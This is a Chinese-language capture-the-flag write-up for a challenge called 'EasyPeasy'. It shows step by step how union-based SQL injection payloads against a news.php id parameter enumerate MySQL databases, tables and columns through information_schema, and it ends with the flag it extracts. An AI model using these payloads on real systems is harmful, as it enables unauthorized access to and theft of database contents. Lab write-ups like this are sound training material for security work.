# EasyPeasy [50]

用 union 進行的 SQL injection，網址點開後如下
```
http://xxx/news.php?id=1
```
id 的參數改一改後會出現不同的內容，顯然是一個從資料庫撈資料的動作。是一個可以利用的 injection 點。

首先要先搜尋資料會在那一個資料庫。information\_schema 是MySQL 用來紀錄所有資料庫名稱的資料庫。
用以下方式可以重資料庫中撈名稱，改limit的值可以依序查看
```
id=-1 union select 1,2,schema_name from information_schema.schemata limit 1,1
```
像取 limit 0,1 會拿到第一項(information\_schema)，limit 1,1 則是第二項名稱為 fl4g。

之後在fl4g這個資料庫中要找哪個 table 紀錄了我們要找的資料，information\_schema.tables 紀錄了所有 table 的資訊。
```
id=-1 union select 1,2,table_name from information_schema.tables WHERE table_schema='fl4g' limit 0,1
```

剛好裡面只有一個 table 叫做 secret 。之後對 secret 做欄位名稱的搜尋。
```
id=-1 union select 1,2,column_name from information_schema.columns where table_name='secret' limit 1,1
```
第二個欄位是 THIS\_IS\_FLAG\_YO 之後把它印出來就是答案了。
```
?id=-1 union select 1,2,THIS_IS_FLAG_YO from fl4g.secret
```

`FLAG{union_based_sqlinj_is_sooooooooo_easy}`

